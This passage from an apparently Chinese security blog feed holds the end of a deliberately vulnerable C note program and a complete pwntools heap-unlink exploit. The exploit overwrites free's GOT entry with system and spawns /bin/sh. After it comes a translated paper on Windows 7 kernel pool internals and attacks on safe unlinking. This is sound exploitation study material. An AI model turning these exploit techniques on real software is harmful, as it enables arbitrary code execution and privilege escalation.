*)malloc(NOTE_SIZE);</div><div class="line">            memset(notes[note_index], 0, NOTE_SIZE);</div><div class="line">            if (NULL != note &amp;&amp; note_size &gt; 0) //initial note</div><div class="line">            &#123;</div><div class="line">                memcpy(notes[note_index], note, note_size);</div><div class="line">            &#125;</div><div class="line">            break;</div><div class="line">        case 1: //free</div><div class="line">            free(notes[note_index]);</div><div class="line">            //printf(&quot;delete notes%d success\n&quot;, note_index);</div><div class="line">            break;</div><div class="line">        case 2: //edit note</div><div class="line">            if (NULL != note &amp;&amp; note_size&gt;0)</div><div class="line">            &#123;</div><div class="line">                memcpy(notes[note_index], note, note_size);</div><div class="line">            &#125;</div><div class="line">            break;</div><div class="line">        default:</div><div class="line">            break;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line">void read_input(char * buf, int read_len, int buf_size)</div><div class="line">&#123;</div><div class="line">    if (NULL == buf || read_len &lt;= 0)</div><div class="line">        return;</div><div class="line">    memset(buf, 0, buf_size);</div><div class="line">    int i = 0;</div><div class="line">    char temp_char;</div><div class="line">    while(1)</div><div class="line">    &#123;</div><div class="line">        temp_char = getchar();</div><div class="line">        if (i&lt;read_len)</div><div class="line">            buf[i] = temp_char;</div><div class="line">        if (temp_char == 0xA)</div><div class="line">            break;</div><div class="line">        i++;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line">uint32_t read_input_uint(char *buf, int read_len, int buf_size)</div><div class="line">&#123;</div><div class="line">    read_input(buf, read_len, buf_size);</div><div class="line">    return strtoul(buf, 0, 10);</div><div class="line">&#125;</div><div class="line"> </div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    char note[NOTE_SIZE*2];</div><div class="line">    memset(note, 0, sizeof(note));</div><div class="line">    char input_buffer[0x1000];</div><div class="line">    char usage[128]=&quot;usage: 0:malloc 1:free 2:edit 3:exit\ninput cmd and note index (eg:0,1 -&gt; cmd=0,note_index=1):\n&quot;;</div><div class="line">    int cmd = 0, note_index = 0, note_len = 0;</div><div class="line">    char *tmp = (char *)malloc(0x30);   //avoid notes become first，because write notes-12 is error when notes is first malloc</div><div class="line">    notes =(char **) malloc((MAX_INDEX+1)*4);</div><div class="line">    while(1)</div><div class="line">    &#123;</div><div class="line">        write(STDOUT_FILENO, usage, strlen(usage));</div><div class="line">        //read command</div><div class="line">        read_input(input_buffer, sizeof(input_buffer), sizeof(input_buffer));</div><div class="line">        sscanf(input_buffer, &quot;%d,%d&quot;, &amp;cmd, &amp;note_index);</div><div class="line">        if (cmd==3) //exit</div><div class="line">            break;</div><div class="line">        if (0 == cmd || 2 == cmd) //get note content inputed</div><div class="line">        &#123;</div><div class="line">            //read note len</div><div class="line">            write(STDOUT_FILENO, &quot;input note len:\n&quot;, 16);</div><div class="line">            note_len = read_input_uint(input_buffer, sizeof(input_buffer), sizeof(input_buffer));</div><div class="line">            //read note content</div><div class="line">            write(STDOUT_FILENO, &quot;input note:\n&quot;, 12);</div><div class="line">            read_input(note, note_len, sizeof(note));</div><div class="line">        &#125;</div><div class="line"> </div><div class="line">        handle_cmd(cmd, note_index, note, note_len);</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>exp如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from pwn import *</div><div class="line">import time</div><div class="line"> </div><div class="line"> </div><div class="line">def change_note_content(cmd, note_index, note_len, note_content):</div><div class="line">        p.recvuntil(&quot;\n&quot;)</div><div class="line">        p.recvuntil(&quot;\n&quot;)</div><div class="line">        cmd = str(cmd) + &quot;,&quot; + str(note_index) + &quot;\n&quot;</div><div class="line">        p.send(cmd)</div><div class="line">        p.recvuntil(&quot;\n&quot;)  # input note len</div><div class="line">        p.send(str(note_len) + &quot;\n&quot;)</div><div class="line">        p.recvuntil(&quot;\n&quot;)  # input note content</div><div class="line">        p.send(note_content + &quot;\n&quot;)</div><div class="line">def free_note(note_index):</div><div class="line">        p.recvuntil(&quot;\n&quot;)</div><div class="line">        p.recvuntil(&quot;\n&quot;)</div><div class="line">        cmd = &quot;1,&quot; + str(note_index) + &quot;\n&quot;</div><div class="line">        p.send(cmd)</div><div class="line"> </div><div class="line"> </div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">        libc = ELF(&apos;libc.so.6&apos;)</div><div class="line">        elf = ELF(&apos;unlink&apos;)</div><div class="line">         </div><div class="line">        p = process(&apos;./unlink&apos;)</div><div class="line">        #p = remote(&apos;127.0.0.1&apos;, 15000)</div><div class="line">         </div><div class="line">        libc_system = libc.symbols[&apos;system&apos;]</div><div class="line">	print &apos;libc_system: &apos;+hex(libc_system)</div><div class="line">	</div><div class="line">        libc_free = libc.symbols[&apos;free&apos;]</div><div class="line">        print &apos;libc_Free: &apos;+hex(libc_free)</div><div class="line">	offset_sys_free = libc_free - libc_system</div><div class="line">        print &apos;\noffset_sys_free= &apos; + hex(offset_sys_free)</div><div class="line">         </div><div class="line">        got_free = elf.got[&apos;free&apos;]</div><div class="line">        print &apos;\ngot_free= &apos; + hex(got_free)</div><div class="line">        #step 1 new malloc note0 and note1</div><div class="line">        print &quot;\nmalloc note0 and note1&quot;</div><div class="line">        change_note_content(0,0,4,&quot;aaaa&quot;)</div><div class="line">        change_note_content(0,1,4,&quot;aaaa&quot;)</div><div class="line">        #step2 fake fd,bk note0 and note1&apos;s presize,size</div><div class="line">        print &quot;\n fake data padding note0 and note1&quot;</div><div class="line">        notes_addr = int(raw_input(&quot;notes address:&quot;), 16)</div><div class="line">        note0_content = p32(0x0)+p32(0x81) + p32(notes_addr - 12) + p32(notes_addr - 8) + &quot;c&quot; * 0x70 + p32(0x80) + p32(0x88|0)</div><div class="line">        change_note_content(2,0, 0x88, note0_content)</div><div class="line">        #step3 free note1</div><div class="line">        print &quot;\n###free note1,cause unlink...###&quot;</div><div class="line">        free_note(1)    #触发unlink，让notes[0]的地址为notes_add-12</div><div class="line"> </div><div class="line">        </div><div class="line">        #step4 write .got free address to notes[0]</div><div class="line">        print &quot;\n###step4 write .got free address to notes[0]###&quot;</div><div class="line">         </div><div class="line">	note0_content = &quot;c&quot;*12+p32(got_free)</div><div class="line">        change_note_content(2,0,0x10,note0_content)</div><div class="line">        #now notes[0] point to got.free,we need now free address of runtime</div><div class="line">        #setp5 by free address+offset,and cover got.free</div><div class="line">        print &quot;\nstep5 calculate system address and write to got.free&quot;</div><div class="line">	system_addr=0xf7e4f310 #这里我直接硬编码了，不然通过计算算出来的地址有点不一样，我也不知道为啥</div><div class="line">        print &quot;\n system_address is &quot; + hex(system_addr)</div><div class="line">        change_note_content(2,0,4,p32(system_addr))</div><div class="line">        time.sleep(10) </div><div class="line">        #step6 free notes[2] cause system(&quot;/bin/sh&quot;)</div><div class="line">        print &apos;\nstep6 malloc notes[2],pading /bin/sh, and execute system(/bin/sh)&apos;</div><div class="line">        change_note_content(0,2,8,&quot;/bin/sh\0&quot;)</div><div class="line">        free_note(2)</div><div class="line">        p.interactive()</div></pre></td></tr></table></figure>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Windows 7 内核池利用技术]]></title>
      <url>http://yoursite.com/2017/07/31/Windows-7-%E5%86%85%E6%A0%B8%E6%B1%A0%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/</url>
      <content type="html"><![CDATA[<p>在Windows 7中，Microsoft引入了安全的unlinking越来越多的影响Windows内核的安全公告。在从双向链接列表中删除条目之前，安全的unlinking旨在通过验证指向相邻列表条目的指针来检测内存损坏。因此，攻击者不能轻易地利用通用技术来利用池溢出或其他池损坏漏洞。在本文中，我们显示，尽管采取了安全措施，Windows 7仍然容易受到通用内核池攻击。特别地，我们显示，池分配器可能在某些情况下无法安全地取消链接空闲列表条目，从而允许攻击者破坏任意内存。 为了阻止所提出的攻击，我们提出进一步加强和增强内核池安全性的方法。<br>Keywords: kernel pool, safe unlinking, exploitation</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>由于软件错误很难完全消除，由于现代计算的复杂性，供应商正在尽最大努力隔离和防止利用安全漏洞。诸如DEP和ASLR之类的缓解已经在当代操作系统中引入，以解决各种常用的开发技术。 但是，由于漏洞的缓解并不能解决安全漏洞的根本原因，因此总是存在边缘案例的情况。 例如，使用返回导向编程（ROP）[15]，单独的DEP很容易规避。此外，利用强大的应用程序嵌入式脚本引擎功能的新颖技术可能完全绕过DEP和ASLR [4]。</p>
<p>利用缓解的补充方法是特权隔离。 通过使用操作系统的内置安全机制对用户和进程施加限制，攻击者无法轻松访问和操纵受管系统中的系统文件和注册表信息。由于在Vista中引入了用户帐户控制（UAC），默认情况下，用户不再运行具有管理权限的常规应用程序。 此外，现代浏览器[2]和文档读取器[13] [12]使用“沙盒”渲染过程来减少解析库和布局引擎中的安全漏洞的影响。 反过来，这也促使攻击者（以及研究人员）将精力集中在特权升级攻击上。 通过在最高特权环中执行任意代码，操作系统的安全性受到破坏。</p>
<p>在大多数情况下，权限升级漏洞是由操作系统内核或第三方驱动程序中的错误引起的。许多缺陷源于动态分配的内核池内存的处理。内核池类似于用户模式的堆，并且多年来容易受到滥用双向链表的unlink操作的通用写入-4攻击[8] [16]。 为了应对越来越多的内核漏洞，微软在Windows7中引入了安全的unlinking[3]。安全的unlinking确保在双向链接空闲列表之间的相邻池块的指针在一个chunk被unlinked之前被验证。</p>
<p>攻击者利用池损坏漏洞的目标是最终执行ring0中的任意代码。这通常以选定位置的任意内存写入或n字节损坏开始。在本文中，我们显示出尽管采取了安全措施，Windows 7中的内核池仍然容易受到generic1攻击。反过来，这些攻击可能允许攻击者完全危及操作系统内核。 我们还表示，设计用于修复write-4攻击的安全的unlinking可能在某些情况下无法实现其目标，并允许攻击者破坏任意内存。 为了阻止所提出的攻击，我们最终提出了进一步加强和增强内核池安全性的方法</p>
<p>本文的其余部分安排如下。在第2节中，我们详细介绍了对Windows 7（和Vista）内核池的内部结构和更改。在第3节和第4节中，我们将讨论并展示影响Windows 7的实际内核池攻击。在第5节中，我们将讨论对策并提出加强内核池的方法。最后，在第6节中，我们提供了论文的结论。</p>
<h2 id="内核池内部"><a href="#内核池内部" class="headerlink" title="内核池内部"></a>内核池内部</h2><p>在本节中，我们详细介绍了池内存分配和释放中涉及的内核池管理结构和算法。了解内核池行为在正确评估其安全性和鲁棒性方面至关重要。为简洁起见，我们假设x86架构（32位）。 然而，大多数结构适用于AMD64 / x64（64位）。 第2.9节讨论了x86和x64架构之间内核池的显着差异。</p>
<h3 id="非均匀内存架构"><a href="#非均匀内存架构" class="headerlink" title="非均匀内存架构"></a>非均匀内存架构</h3><p>对于每个新版本的Windows，内存管理器都得到增强，以更好地支持非均匀内存架构（NUMA），这是现代多处理器系统中使用的内存设计架构。NUMA将不同的内存库专用于不同的处理器，允许更快速地访问本地内存，而远程内存访问速度更慢。处理器和存储器以更小的单元组合在一起，被称为节点，由执行内核中的KNODE结构定义。</p>
<p>————————————</p>
<p>适用于任何n字节池腐败漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">typedef struct _KNODE</div><div class="line">&#123;</div><div class="line">/*0x000*/ union _SLIST_HEADER PagedPoolSListHead;</div><div class="line">/*0x008*/ union _SLIST_HEADER NonPagedPoolSListHead[3];</div><div class="line">/*0x020*/ struct _GROUP_AFFINITY Affinity;</div><div class="line">/*0x02C*/ ULONG32 ProximityId;</div><div class="line">/*0x030*/ UINT16 NodeNumber;</div><div class="line">/*0x032*/ UINT16 PrimaryNodeNumber;</div><div class="line">/*0x034*/ UINT8 MaximumProcessors;</div><div class="line">/*0x035*/ UINT8 Color;</div><div class="line">/*0x036*/ struct _flags Flags;</div><div class="line">/*0x037*/ UINT8 NodePad0;</div><div class="line">/*0x038*/ ULONG32 Seed;</div><div class="line">/*0x03C*/ ULONG32 MmShiftedColor;</div><div class="line">/*0x040*/ ULONG32 FreeCount[2];</div><div class="line">/*0x048*/ struct _CACHED_KSTACK_LIST CachedKernelStacks;</div><div class="line">/*0x060*/ LONG32 ParkLock;</div><div class="line">/*0x064*/ ULONG32 NodePad1;</div><div class="line">/*0x068*/ UINT8 _PADDING0_[0x18];</div><div class="line">&#125; KNODE, *PKNODE;</div></pre></td></tr></table></figure></p>
<p>在多节点系统(nt!KeNumberNodes&gt;1)上，内存管理器将总是尝试从理想的节点分配。因此，KNODE提供了有关在Color字段中找到本地内存的信息。 该值是由分配和释放算法用于将节点与其首选池相关联的数组索引。此外，KNODE定义了四个单向的per-node lookaside链表，用于空闲池页（在2.6节中讨论过）。</p>
<h3 id="系统内存池"><a href="#系统内存池" class="headerlink" title="系统内存池"></a>系统内存池</h3><p>在系统初始化时，内存管理器根据系统节点的数量创建动态大小的内存池。 每个池由池描述符（第2.3节讨论）定义，一个跟踪池使用情况并定义池属性（如内存类型）的管理结构。有两种不同类型的池内存：paged和non-paged。</p>
<p>分页池内存可以从任何进程上下文中分配和访问，但只能在IRQL &lt;DPC / dispatch级别进行访问。 使用的分页池数量由nt！ExpNumberOfPagedPools给出。 在单处理器系统中，定义了四（4）个分页池描述符，由nt！ExpPagedPoolDescriptor数组中的索引1到4表示。 在多处理器系统上，每个节点定义一（1）个分页池描述符。 在这两种情况下，为原型池/全页分配定义了一个额外的分页池描述符，由nt!ExpPagedPoolDescriptor中的索引0表示。因此，在大多数桌面系统中，定义了五（5）个分页池描述符。</p>
<p>非分页池内存始终保留在物理内存中。 这是IRQL&gt; = DPC / dispatch级别执行的线程（如中断处理程序）所必需的，因为页面错误不能及时满足。目前使用的非分页池的数量由nt！ExpNumberOfNonPagedPools给出。在单处理器系统上，nt!PoolVector数组的第一个索引指向非分页池描述符。在多处理器系统上，每个节点都有自己的非分页池描述符，由nt!ExpNonPagedPoolDescriptor数组索引</p>
<p>此外，会话池内存（由win32k使用）用于会话空间分配，并且是每个用户会话唯一的。虽然非分页会话存储器使用全局非分页池描述符，但分页会话池内存具有在nt!MM SESSION SPACE中定义的其自己的池描述符。要获得会话池描述符，Windows 7会解析会话空间结构的相关联的nt!EPROCESS结构（当前正在执行的线程），然后找到嵌入的分页池描述符。</p>
<h3 id="池描述符"><a href="#池描述符" class="headerlink" title="池描述符"></a>池描述符</h3><p>与用户模式堆很像，每个内核池都需要一个管理结构。 池描述符负责跟踪正在运行的分配数量，正在使用的页面以及有关池使用情况的其他信息。 它也有助于系统跟踪可重复使用的池块。 池描述符由以下结构（nt!POOL DESCRIPTOR）定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _POOL_DESCRIPTOR</div><div class="line">&#123;</div><div class="line">/*0x000*/ enum _POOL_TYPE PoolType;</div><div class="line">union &#123;</div><div class="line">/*0x004*/ struct _KGUARDED_MUTEX PagedLock;</div><div class="line">/*0x004*/ ULONG32 NonPagedLock;</div><div class="line">&#125;;</div><div class="line">/*0x040*/ LONG32 RunningAllocs;</div><div class="line">/*0x044*/ LONG32 RunningDeAllocs;</div><div class="line">/*0x048*/ LONG32 TotalBigPages;</div><div class="line">/*0x04C*/ LONG32 ThreadsProcessingDeferrals;</div><div class="line">/*0x050*/ ULONG32 TotalBytes;</div><div class="line">/*0x054*/ UINT8 _PADDING0_[0x2C];</div><div class="line">/*0x080*/ ULONG32 PoolIndex;</div><div class="line">/*0x084*/ UINT8 _PADDING1_[0x3C];</div><div class="line">/*0x0C0*/ LONG32 TotalPages;</div><div class="line">/*0x0C4*/ UINT8 _PADDING2_[0x3C];</div><div class="line">/*0x100*/ VOID** PendingFrees;</div><div class="line">/*0x104*/ LONG32 PendingFreeDepth;</div><div class="line">/*0x108*/ UINT8 _PADDING3_[0x38];</div><div class="line">/*0x140*/ struct _LIST_ENTRY ListHeads[512];</div><div class="line">&#125; POOL_DESCRIPTOR, *PPOOL_DESCRIPTOR;</div></pre></td></tr></table></figure>
<p>池描述符包含内存管理器使用的几个重要列表。PendingFrees指出的延迟空闲列表是一个等待被释放池块的单向链表。在第2.8节中有详细的解释。ListHeads是一系列相同大小的释放池块的双向链表。 与延迟的空闲列表不同，ListHeads列表中的块已经被释放，并且可以由内存管理器随时分配。 我们在下面的部分讨论ListHeads</p>
<h3 id="ListHeads列表（空闲列表）"><a href="#ListHeads列表（空闲列表）" class="headerlink" title="ListHeads列表（空闲列表）"></a>ListHeads列表（空闲列表）</h3><p>ListHeads列表或空闲列表以8字节粒度的大小排序，用于高达4080字节的分配。空闲块按照块大小索引到ListHeads数组中，计算为所请求的字节数，舍入为8的倍数，除以8，或BlockSize =（NumberOfBytes + 0xF）&gt;&gt; 3。执行舍入以保留池头部的空间，在所有池块之前的结构。 在x86 Windows上，池头部定义如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">typedef struct _POOL_HEADER</div><div class="line">&#123;</div><div class="line">union &#123;</div><div class="line">struct &#123;</div><div class="line">/*0x000*/ UINT16 PreviousSize : 9;</div><div class="line">/*0x000*/ UINT16 PoolIndex : 7;</div><div class="line">/*0x002*/ UINT16 BlockSize : 9;</div><div class="line">/*0x002*/ UINT16 PoolType : 7;</div><div class="line">&#125;;</div><div class="line">/*0x000*/ ULONG32 Ulong1;</div><div class="line">&#125;;</div><div class="line">union &#123;</div><div class="line">/*0x004*/ ULONG32 PoolTag;</div><div class="line">struct &#123;</div><div class="line">/*0x004*/ UINT16 AllocatorBackTraceIndex;</div><div class="line">/*0x006*/ UINT16 PoolTagHash;</div><div class="line">&#125;;</div><div class="line">&#125;;</div><div class="line">&#125; POOL_HEADER, *PPOOL_HEADER;</div></pre></td></tr></table></figure></p>
<p>池头部保存分配所需的信息和释放算法正常运行。 PreviousSize表示前一个池块的块大小。 由于内存管理器总是尝试通过合并边界空闲块来减少碎片，因此通常用于定位前一个块的池头。 PreviousSize也可以为零，在这种情况下，池块位于池页面的开头</p>
<p>PoolIndex将索引提供到关联的池描述符数组中，例如nt!ExpPagedPoolDescriptor。 它被释放算法用于确保池块被释放到适当的池描述符ListHeads。在3.4节中，我们展示了攻击者如何破坏此值，以便将池头损坏（如池溢出）扩展为任意内存损坏</p>
<p>如其名称所示，PoolType定义了一个块的池类型。但是，它也表明一个块是忙还是空闲。 如果一个块是空闲的，则PoolType设置为零。另一方面，如果某个块正忙，则将PoolType设置为其描述符的池类型（POOL TYPE枚举中的值，如下所示）与使用池中的位掩码进行“或”对齐。 此位掩码在Vista及更高版本中设置为2，而XP/2003则设置为4。 例如。 对于Vista和Windows 7上的一个繁忙的分页池块，PoolType = PagedPool | 2 = 3。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">typedef enum _POOL_TYPE</div><div class="line">&#123;</div><div class="line">NonPagedPool = 0 /*0x0*/,</div><div class="line">PagedPool = 1 /*0x1*/,</div><div class="line">NonPagedPoolMustSucceed = 2 /*0x2*/,</div><div class="line">DontUseThisType = 3 /*0x3*/,</div><div class="line">NonPagedPoolCacheAligned = 4 /*0x4*/,</div><div class="line">PagedPoolCacheAligned = 5 /*0x5*/,</div><div class="line">NonPagedPoolCacheAlignedMustS = 6 /*0x6*/,</div><div class="line">MaxPoolType = 7 /*0x7*/,</div><div class="line">NonPagedPoolSession = 32 /*0x20*/,</div><div class="line">PagedPoolSession = 33 /*0x21*/,</div><div class="line">NonPagedPoolMustSucceedSession = 34 /*0x22*/,</div><div class="line">DontUseThisTypeSession = 35 /*0x23*/,</div><div class="line">NonPagedPoolCacheAlignedSession = 36 /*0x24*/,</div><div class="line">PagedPoolCacheAlignedSession = 37 /*0x25*/,</div><div class="line">NonPagedPoolCacheAlignedMustSSession = 38 /*0x26*/</div><div class="line">&#125; POOL_TYPE, *PPOOL_TYPE;</div></pre></td></tr></table></figure>
<p>如果一个池块是空闲的，并且在ListHeads列表中，则它的池头部是LIST ENTRY结构。因此，ListHead不保持单个块大小（8字节）的块，因为它们不够大以容纳结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">typedef struct _LIST_ENTRY</div><div class="line">&#123;</div><div class="line">/*0x000*/ struct _LIST_ENTRY* Flink;</div><div class="line">/*0x004*/ struct _LIST_ENTRY* Blink;</div><div class="line">&#125; LIST_ENTRY, *PLIST_ENTRY;</div></pre></td></tr></table></figure>
<p>LIST ENTRY结构用于在双向链表上连接池块。历史上，它一直是在用户模式堆[5]和内核池[8] [16]中利用内存损坏漏洞的目标，主要是由于众所周知的“write-4”利用技术。 LIST ENTRY攻击用户模式堆与Windows XP SP2的发布[5]，同样在内核池与Windows 7 [3]。</p>
<h3 id="Lookaside表"><a href="#Lookaside表" class="headerlink" title="Lookaside表"></a>Lookaside表</h3><p>内核使用快速单向列表（LIFO）来更快地分配和释放小池块。它们旨在以高度并发的代码运行，并在添加和删除条目时使用原子比较和交换指令。为了更好地利用CPU缓存，在处理器控制块（KPRCB）中，每个处理器定义了后备列表。KPRCB结构保存了分页（PPPagedLookasideList）和非分页（PPNPagedLookasideList）分配的lookaside表，以及用于经常请求的固定大小分配（如I / O请求数据包和内存描述符列表）的特殊专用lookaside表（PPLookasideList）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">typedef struct _KPRCB</div><div class="line">&#123;</div><div class="line">...</div><div class="line">/*0x5A0*/ struct _PP_LOOKASIDE_LIST PPLookasideList[16];</div><div class="line">/*0x620*/ struct _GENERAL_LOOKASIDE_POOL PPNPagedLookasideList[32];</div><div class="line">/*0xF20*/ struct _GENERAL_LOOKASIDE_POOL PPPagedLookasideList[32];</div><div class="line">...</div><div class="line">&#125; KPRCB, *PKPRCB;</div></pre></td></tr></table></figure></p>
<p>对于分页和未分页的lookaside表，最大块大小为0x20。<br>因此，每种类型有32个独特的lookaside列表。 每个lookaside表由GENERAL LOOKASIDE POOL结构定义，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">typedef struct _GENERAL_LOOKASIDE_POOL</div><div class="line">&#123;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x000*/ union _SLIST_HEADER ListHead;</div><div class="line">/*0x000*/ struct _SINGLE_LIST_ENTRY SingleListHead;</div><div class="line">&#125;;</div><div class="line">/*0x008*/ UINT16 Depth;</div><div class="line">/*0x00A*/ UINT16 MaximumDepth;</div><div class="line">/*0x00C*/ ULONG32 TotalAllocates;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x010*/ ULONG32 AllocateMisses;</div><div class="line">/*0x010*/ ULONG32 AllocateHits;</div><div class="line">&#125;;</div><div class="line">/*0x014*/ ULONG32 TotalFrees;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x018*/ ULONG32 FreeMisses;</div><div class="line">/*0x018*/ ULONG32 FreeHits;</div><div class="line">&#125;;</div><div class="line">/*0x01C*/ enum _POOL_TYPE Type;</div><div class="line">/*0x020*/ ULONG32 Tag;</div><div class="line">/*0x024*/ ULONG32 Size;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x028*/ PVOID AllocateEx;</div><div class="line">/*0x028*/ PVOID Allocate;</div><div class="line">&#125;;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x02C*/ PVOID FreeEx;</div><div class="line">/*0x02C*/ PVOID Free;</div><div class="line">&#125;;</div><div class="line">/*0x030*/ struct _LIST_ENTRY ListEntry;</div><div class="line">/*0x038*/ ULONG32 LastTotalAllocates;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x03C*/ ULONG32 LastAllocateMisses;</div><div class="line">/*0x03C*/ ULONG32 LastAllocateHits;</div><div class="line">&#125;;</div><div class="line">/*0x040*/ ULONG32 Future[2];</div><div class="line">&#125; GENERAL_LOOKASIDE_POOL, *PGENERAL_LOOKASIDE_POOL;</div></pre></td></tr></table></figure>
<p>在此结构中，SingleListHead.Next指向单向lookside表上的第一个空闲池块。lookaside表的大小受深度值的限制，由余额集管理器4根据lookaside表中的命中和未命中数量定期调整。 因此，经常使用的lookaside将具有比不经常使用的lookaside表更大的深度值。</p>
<p>会话池也定义了lookaside表。 分页会话池分配使用在会话空间中定义的单独的lookaside表（nt!ExpSessionPoolLookaside）。每个会话lookaside表的最大块大小为0x19，由nt!ExpSessionPoolSmallLists设置。 会话池lookaside表使用GENERAL LOOKASIDE结构，与GENERAL LOOKASIDE POOL相同，但带有额外的填充。 对于非分页会话池分配，使用以前讨论的非分页处理器lookaside表。</p>
<p>如果设置了热/冷页分离池标志（nt!ExpPoolFlags＆0x100），则池块的lookaside表将被禁用。标志在系统启动期间设置，以提高速度并减少内存占用。定时器（在nt!ExpBootFinishedTimer中设置）在引导后2分钟关闭热/冷页分离。</p>
<h3 id="大池分配"><a href="#大池分配" class="headerlink" title="大池分配"></a>大池分配</h3><p>池描述符ListHeads维护小于一页的块。 大于4080字节（需要一页或多页）的池分配由nt!ExpAllocateBigPool处理。反过来，这个函数调用nt！MiAllocatePoolPages，池页分配器，它将请求的大小舍入到最接近的页面大小。 块大小为1和前一大小为0的“Frag”块立即放置在大池分配之后，以便池分配器可以利用剩余的页面片段。 然后将多余的字节放回适当的池描述符ListHeads列表的尾部。</p>
<p>从2.1节回顾，每个节点（由KNODE定义）具有与它们相关联的4个单向lookaside链表。 这些列表由池页面分配器在快速处理小页面计数的请求中使用。对于分页内存，KNODE为单页分配定义了一个lookaside表（PagedPoolSListHead）。对于非分页分配，定义页数1,2和3的lookaside表（NonPagedPoolSListHead [3]）。 池页lookaside表的大小由系统中存在的物理页数确定。</p>
